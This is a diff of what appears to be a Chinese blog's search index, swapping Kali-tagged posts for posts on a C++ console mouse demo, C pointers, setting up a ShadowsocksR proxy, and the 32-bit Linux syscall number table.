+			<span class="built_in">SetConsoleCursorPosition</span>(hOut, crHome);
+			<span class="built_in">printf</span>(<span class="string">&quot;[Cursor Position] X: %2lu  Y: %2lu&quot;</span>, crPos.X, crPos.Y);
+			<span class="built_in">SetConsoleCursorPosition</span>(hOut, bInfo.dwCursorPosition);
+			<span class="keyword">switch</span> (mouseRec.Event.MouseEvent.dwButtonState)
+			&#123;
+				<span class="keyword">case</span> FROM_LEFT_1ST_BUTTON_PRESSED:			<span class="comment">// 左键 输出A</span>
+					<span class="built_in">FillConsoleOutputCharacter</span>(hOut, <span class="string">&#x27;A&#x27;</span>, <span class="number">1</span>, crPos, &amp;res);
+					<span class="keyword">break</span>;		<span class="comment">// 如果使用printf输出，则之前需要先设置光标的位置</span>
+ 	
+				<span class="keyword">case</span> RIGHTMOST_BUTTON_PRESSED:				<span class="comment">// 右键 输出a</span>
+					<span class="built_in">FillConsoleOutputCharacter</span>(hOut, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, crPos, &amp;res);
+					<span class="keyword">break</span>;
+	 
+				<span class="keyword">default</span>:
+					<span class="keyword">break</span>;
+			&#125;
+		&#125;		
+	&#125;
+	<span class="built_in">CloseHandle</span>(hOut);  <span class="comment">// 关闭标准输出设备句柄  </span>
+	<span class="built_in">CloseHandle</span>(hIn);   <span class="comment">// 关闭标准输入设备句柄  </span>
+	<span class="keyword">return</span> <span class="number">0</span>;  
+&#125;</code></pre>]]></content>
       <tags>
-        <tag>kali</tag>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
-    <title>身份认证攻击</title>
-    <url>/2025/03/17/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/</url>
+    <title>理解C语言中的指针</title>
+    <url>/2025/03/25/%E7%90%86%E8%A7%A3C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%8C%87%E9%92%88/</url>
+    <content><![CDATA[<p>指针变量的声明：</p>
+<pre><code class="highlight plaintext">[type]* [variable]</code></pre>
+<p>无论<code>[type]</code>是什么东西，<code>[variable]</code>中储存的永远是一个地址，占用的内存大小是固定值，64位8字节，32位4字节</p>
+<p>当<code>[variable]</code>加上内存访问符*时，<code>*[variable]</code>就是一个大小不确定的东西，其大小由[type]决定</p>
+<p>为了控制*[variable]访问的内存空间大小，我们可以通过<code>*([type] *)[variable]</code>来控制</p>
+<p><code>void* [variable]</code>是合法的，<code>void [variable]</code>是非法的</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>科学上网</title>
+    <url>/2023/11/19/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
     <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
+<p><del>不会真的还有人不会科学上网吧</del></p>
 </blockquote>
+<p><strong>概念简介(非专业)</strong></p>
+<p>市面上卖的VPN一般都是定制的客户端，即买即用。<br>而通常情况下，我们并不会想花钱买，由此就会去薅免费机场，比如：</p>
+<blockquote>
+<p><a href="103.186.186.186">几鸡-学习助理</a>(下面会以这个为例)</p>
+</blockquote>
+<p>有了机场，我们就需要借用代理连接到机场，常见的有:</p>
+<blockquote>
+<p>Clash for Windows(官方已挂，不提供官方链接<a href="https://clashcn.com/clash-for-windows-download">这个链接可以将就一下</a>)<br>Clash for Android(官方已挂，不提供官方链接<a href="https://clashcn.com/clash-for-android-official">这个链接可以将就一下</a>)<br><a href="https://github.com/shadowsocksrr/shadowsocksr-csharp/releases">ShadowsocksR (for Windows)</a><br><a href="https://github.com/shadowsocksrr/shadowsocksr-android/releases">ShadowsocksR (for Android)</a></p>
+</blockquote>
+<h2 id="教程正文"><a href="#教程正文" class="headerlink" title="教程正文"></a>教程正文</h2><h3 id="机场注册"><a href="#机场注册" class="headerlink" title="机场注册"></a>机场注册</h3><p>刚刚说了，以<a href="103.186.186.186">几鸡</a>为例，so，请打开几鸡，注册一个账号，这个过程就不需要我演示了吧。</p>
+<blockquote>
+<p>Q:为什么要用几鸡？<br>A:几鸡是一个部分免费，稳定的机场。每日签到可获得7天账号有效期、几G的流量。月初恢复10G.</p>
+</blockquote>
+<p>注册好后完成签到。<br>然后如图所示复制ShadowsocksR订阅链接:</p>
+<p><img src="https://s2.loli.net/2024/02/10/4WkAVgZf5lnTUhO.gif" alt="复制ShadowsocksR订阅链接"></p>
+<h3 id="windows-教程"><a href="#windows-教程" class="headerlink" title="windows 教程"></a>windows 教程</h3><p>下载<a href="https://github.com/shadowsocksrr/shadowsocksr-csharp/releases">ShadowsocksR (for Windows)</a><br>解压后打开ShadowsocksR-dotnet2.0.exe（ShadowsocksR-dotnet4.0.exe可能会报错）(个人感觉没有比Clash For Windows好用)</p>
+<blockquote>
+<p>如果有安全询问请关闭</p>
+</blockquote>
+<p>打开软件后如果有弹出软件的UI界面请先关闭，如果没反应就不管。</p>
+<p>看看任务栏是否多了一个小飞机图标（默认白色）</p>
+<p>右键任务栏小飞机图标，点击<strong>选择服务器</strong>目录下的<strong>SSR服务器订阅设置…<strong>，在弹出的窗口内点击</strong>Add</strong>，然后在新建的一个配置内输入</p>
+<blockquote>
+<p>网址：（删掉原有内容，填入刚刚复制的订阅链接）<br>组名：（不用动，也动不了）<br>最近更新：(｢･ω･)｢（不用动，也动不了）</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2024/02/10/D9Goh3vAlZebHjX.gif" alt="服务器订阅"></p>
 ]]></content>
       <tags>
-        <tag>kali</tag>
+        <tag>科学上网</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Linux系统调用号表</title>
+    <url>/2024/12/15/Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%E8%A1%A8/</url>
+    <content><![CDATA[<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><pre><code class="highlight c"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span>
+<span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_32_H 1</span>
+
+<span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 0</span>
+<span class="meta">#<span class="keyword">define</span> __NR_exit 1</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fork 2</span>
+<span class="meta">#<span class="keyword">define</span> __NR_read 3</span>
+<span class="meta">#<span class="keyword">define</span> __NR_write 4</span>
+<span class="meta">#<span class="keyword">define</span> __NR_open 5</span>
+<span class="meta">#<span class="keyword">define</span> __NR_close 6</span>
+<span class="meta">#<span class="keyword">define</span> __NR_waitpid 7</span>
+<span class="meta">#<span class="keyword">define</span> __NR_creat 8</span>
+<span class="meta">#<span class="keyword">define</span> __NR_link 9</span>
+<span class="meta">#<span class="keyword">define</span> __NR_unlink 10</span>
+<span class="meta">#<span class="keyword">define</span> __NR_execve 11</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chdir 12</span>
+<span class="meta">#<span class="keyword">define</span> __NR_time 13</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mknod 14</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chmod 15</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lchown 16</span>
+<span class="meta">#<span class="keyword">define</span> __NR_break 17</span>
+<span class="meta">#<span class="keyword">define</span> __NR_oldstat 18</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lseek 19</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpid 20</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mount 21</span>
+<span class="meta">#<span class="keyword">define</span> __NR_umount 22</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setuid 23</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getuid 24</span>
+<span class="meta">#<span class="keyword">define</span> __NR_stime 25</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ptrace 26</span>
+<span class="meta">#<span class="keyword">define</span> __NR_alarm 27</span>
+<span class="meta">#<span class="keyword">define</span> __NR_oldfstat 28</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pause 29</span>
+<span class="meta">#<span class="keyword">define</span> __NR_utime 30</span>
+<span class="meta">#<span class="keyword">define</span> __NR_stty 31</span>
+<span class="meta">#<span class="keyword">define</span> __NR_gtty 32</span>
+<span class="meta">#<span class="keyword">define</span> __NR_access 33</span>
+<span class="meta">#<span class="keyword">define</span> __NR_nice 34</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ftime 35</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sync 36</span>
+<span class="meta">#<span class="keyword">define</span> __NR_kill 37</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rename 38</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mkdir 39</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rmdir 40</span>
+<span class="meta">#<span class="keyword">define</span> __NR_dup 41</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pipe 42</span>
+<span class="meta">#<span class="keyword">define</span> __NR_times 43</span>
+<span class="meta">#<span class="keyword">define</span> __NR_prof 44</span>
+<span class="meta">#<span class="keyword">define</span> __NR_brk 45</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setgid 46</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getgid 47</span>
+<span class="meta">#<span class="keyword">define</span> __NR_signal 48</span>
+<span class="meta">#<span class="keyword">define</span> __NR_geteuid 49</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getegid 50</span>
+<span class="meta">#<span class="keyword">define</span> __NR_acct 51</span>
+<span class="meta">#<span class="keyword">define</span> __NR_umount2 52</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lock 53</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ioctl 54</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fcntl 55</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mpx 56</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setpgid 57</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ulimit 58</span>
+<span class="meta">#<span class="keyword">define</span> __NR_oldolduname 59</span>
+<span class="meta">#<span class="keyword">define</span> __NR_umask 60</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chroot 61</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ustat 62</span>
+<span class="meta">#<span class="keyword">define</span> __NR_dup2 63</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getppid 64</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpgrp 65</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setsid 66</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sigaction 67</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sgetmask 68</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ssetmask 69</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setreuid 70</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setregid 71</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sigsuspend 72</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sigpending 73</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sethostname 74</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setrlimit 75</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getrlimit 76</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getrusage 77</span>
+<span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 78</span>
+<span class="meta">#<span class="keyword">define</span> __NR_settimeofday 79</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getgroups 80</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setgroups 81</span>
+<span class="meta">#<span class="keyword">define</span> __NR_select 82</span>
+<span class="meta">#<span class="keyword">define</span> __NR_symlink 83</span>
+<span class="meta">#<span class="keyword">define</span> __NR_oldlstat 84</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readlink 85</span>
+<span class="meta">#<span class="keyword">define</span> __NR_uselib 86</span>
+<span class="meta">#<span class="keyword">define</span> __NR_swapon 87</span>
+<span class="meta">#<span class="keyword">define</span> __NR_reboot 88</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readdir 89</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mmap 90</span>
+<span class="meta">#<span class="keyword">define</span> __NR_munmap 91</span>
+<span class="meta">#<span class="keyword">define</span> __NR_truncate 92</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ftruncate 93</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchmod 94</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchown 95</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpriority 96</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setpriority 97</span>
+<span class="meta">#<span class="keyword">define</span> __NR_profil 98</span>
+<span class="meta">#<span class="keyword">define</span> __NR_statfs 99</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fstatfs 100</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ioperm 101</span>
+<span class="meta">#<span class="keyword">define</span> __NR_socketcall 102</span>
+<span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setitimer 104</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getitimer 105</span>
+<span class="meta">#<span class="keyword">define</span> __NR_stat 106</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lstat 107</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fstat 108</span>
+<span class="meta">#<span class="keyword">define</span> __NR_olduname 109</span>
+<span class="meta">#<span class="keyword">define</span> __NR_iopl 110</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vhangup 111</span>
+<span class="meta">#<span class="keyword">define</span> __NR_idle 112</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vm86old 113</span>
+<span class="meta">#<span class="keyword">define</span> __NR_wait4 114</span>
+<span class="meta">#<span class="keyword">define</span> __NR_swapoff 115</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sysinfo 116</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ipc 117</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fsync 118</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sigreturn 119</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clone 120</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setdomainname 121</span>
+<span class="meta">#<span class="keyword">define</span> __NR_uname 122</span>
+<span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 123</span>
+<span class="meta">#<span class="keyword">define</span> __NR_adjtimex 124</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mprotect 125</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sigprocmask 126</span>
+<span class="meta">#<span class="keyword">define</span> __NR_create_module 127</span>
+<span class="meta">#<span class="keyword">define</span> __NR_init_module 128</span>
+<span class="meta">#<span class="keyword">define</span> __NR_delete_module 129</span>
+<span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 130</span>
+<span class="meta">#<span class="keyword">define</span> __NR_quotactl 131</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpgid 132</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchdir 133</span>
+<span class="meta">#<span class="keyword">define</span> __NR_bdflush 134</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sysfs 135</span>
+<span class="meta">#<span class="keyword">define</span> __NR_personality 136</span>
+<span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 137</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setfsuid 138</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setfsgid 139</span>
+<span class="meta">#<span class="keyword">define</span> __NR__llseek 140</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getdents 141</span>
+<span class="meta">#<span class="keyword">define</span> __NR__newselect 142</span>
+<span class="meta">#<span class="keyword">define</span> __NR_flock 143</span>
+<span class="meta">#<span class="keyword">define</span> __NR_msync 144</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readv 145</span>
+<span class="meta">#<span class="keyword">define</span> __NR_writev 146</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getsid 147</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fdatasync 148</span>
+<span class="meta">#<span class="keyword">define</span> __NR__sysctl 149</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mlock 150</span>
+<span class="meta">#<span class="keyword">define</span> __NR_munlock 151</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mlockall 152</span>
+<span class="meta">#<span class="keyword">define</span> __NR_munlockall 153</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 154</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 155</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 156</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 157</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_yield 158</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 159</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 160</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 161</span>
+<span class="meta">#<span class="keyword">define</span> __NR_nanosleep 162</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mremap 163</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setresuid 164</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getresuid 165</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vm86 166</span>
+<span class="meta">#<span class="keyword">define</span> __NR_query_module 167</span>
+<span class="meta">#<span class="keyword">define</span> __NR_poll 168</span>
+<span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 169</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setresgid 170</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getresgid 171</span>
+<span class="meta">#<span class="keyword">define</span> __NR_prctl 172</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 173</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 174</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 175</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 176</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 177</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 178</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 179</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pread64 180</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pwrite64 181</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chown 182</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getcwd 183</span>
+<span class="meta">#<span class="keyword">define</span> __NR_capget 184</span>
+<span class="meta">#<span class="keyword">define</span> __NR_capset 185</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 186</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendfile 187</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpmsg 188</span>
+<span class="meta">#<span class="keyword">define</span> __NR_putpmsg 189</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vfork 190</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ugetrlimit 191</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mmap2 192</span>
+<span class="meta">#<span class="keyword">define</span> __NR_truncate64 193</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ftruncate64 194</span>
+<span class="meta">#<span class="keyword">define</span> __NR_stat64 195</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lstat64 196</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fstat64 197</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lchown32 198</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getuid32 199</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getgid32 200</span>
+<span class="meta">#<span class="keyword">define</span> __NR_geteuid32 201</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getegid32 202</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setreuid32 203</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setregid32 204</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getgroups32 205</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setgroups32 206</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchown32 207</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setresuid32 208</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getresuid32 209</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setresgid32 210</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getresgid32 211</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chown32 212</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setuid32 213</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setgid32 214</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setfsuid32 215</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setfsgid32 216</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pivot_root 217</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mincore 218</span>
+<span class="meta">#<span class="keyword">define</span> __NR_madvise 219</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getdents64 220</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fcntl64 221</span>
+<span class="meta">#<span class="keyword">define</span> __NR_gettid 224</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readahead 225</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setxattr 226</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 227</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 228</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getxattr 229</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 230</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 231</span>
+<span class="meta">#<span class="keyword">define</span> __NR_listxattr 232</span>
+<span class="meta">#<span class="keyword">define</span> __NR_llistxattr 233</span>
+<span class="meta">#<span class="keyword">define</span> __NR_flistxattr 234</span>
+<span class="meta">#<span class="keyword">define</span> __NR_removexattr 235</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 236</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 237</span>
+<span class="meta">#<span class="keyword">define</span> __NR_tkill 238</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendfile64 239</span>
+<span class="meta">#<span class="keyword">define</span> __NR_futex 240</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 241</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 242</span>
+<span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 243</span>
+<span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 244</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_setup 245</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_destroy 246</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_getevents 247</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_submit 248</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_cancel 249</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fadvise64 250</span>
+<span class="meta">#<span class="keyword">define</span> __NR_exit_group 252</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 253</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_create 254</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 255</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 256</span>
+<span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 257</span>
+<span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 258</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_create 259</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_settime 260</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 261</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 262</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_delete 263</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_settime 264</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 265</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_getres 266</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 267</span>
+<span class="meta">#<span class="keyword">define</span> __NR_statfs64 268</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fstatfs64 269</span>
+<span class="meta">#<span class="keyword">define</span> __NR_tgkill 270</span>
+<span class="meta">#<span class="keyword">define</span> __NR_utimes 271</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fadvise64_64 272</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vserver 273</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mbind 274</span>
+<span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 275</span>
+<span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 276</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_open 277</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 278</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 279</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 280</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_notify 281</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 282</span>
+<span class="meta">#<span class="keyword">define</span> __NR_kexec_load 283</span>
+<span class="meta">#<span class="keyword">define</span> __NR_waitid 284</span>
+<span class="meta">#<span class="keyword">define</span> __NR_add_key 286</span>
+<span class="meta">#<span class="keyword">define</span> __NR_request_key 287</span>
+<span class="meta">#<span class="keyword">define</span> __NR_keyctl 288</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 289</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 290</span>
+<span class="meta">#<span class="keyword">define</span> __NR_inotify_init 291</span>
+<span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 292</span>
+<span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 293</span>
+<span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 294</span>
+<span class="meta">#<span class="keyword">define</span> __NR_openat 295</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mkdirat 296</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mknodat 297</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchownat 298</span>
+<span class="meta">#<span class="keyword">define</span> __NR_futimesat 299</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fstatat64 300</span>
+<span class="meta">#<span class="keyword">define</span> __NR_unlinkat 301</span>
+<span class="meta">#<span class="keyword">define</span> __NR_renameat 302</span>
+<span class="meta">#<span class="keyword">define</span> __NR_linkat 303</span>
+<span class="meta">#<span class="keyword">define</span> __NR_symlinkat 304</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readlinkat 305</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchmodat 306</span>
+<span class="meta">#<span class="keyword">define</span> __NR_faccessat 307</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pselect6 308</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ppoll 309</span>
+<span class="meta">#<span class="keyword">define</span> __NR_unshare 310</span>
+<span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 311</span>
+<span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 312</span>
+<span class="meta">#<span class="keyword">define</span> __NR_splice 313</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 314</span>
+<span class="meta">#<span class="keyword">define</span> __NR_tee 315</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vmsplice 316</span>
+<span class="meta">#<span class="keyword">define</span> __NR_move_pages 317</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getcpu 318</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 319</span>
+<span class="meta">#<span class="keyword">define</span> __NR_utimensat 320</span>
+<span class="meta">#<span class="keyword">define</span> __NR_signalfd 321</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 322</span>
+<span class="meta">#<span class="keyword">define</span> __NR_eventfd 323</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fallocate 324</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 325</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 326</span>
+<span class="meta">#<span class="keyword">define</span> __NR_signalfd4 327</span>
+<span class="meta">#<span class="keyword">define</span> __NR_eventfd2 328</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 329</span>
+<span class="meta">#<span class="keyword">define</span> __NR_dup3 330</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pipe2 331</span>
+<span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 332</span>
+<span class="meta">#<span class="keyword">define</span> __NR_preadv 333</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pwritev 334</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 335</span>
+<span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 336</span>
+<span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 337</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 338</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 339</span>
+<span class="meta">#<span class="keyword">define</span> __NR_prlimit64 340</span>
+<span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 341</span>
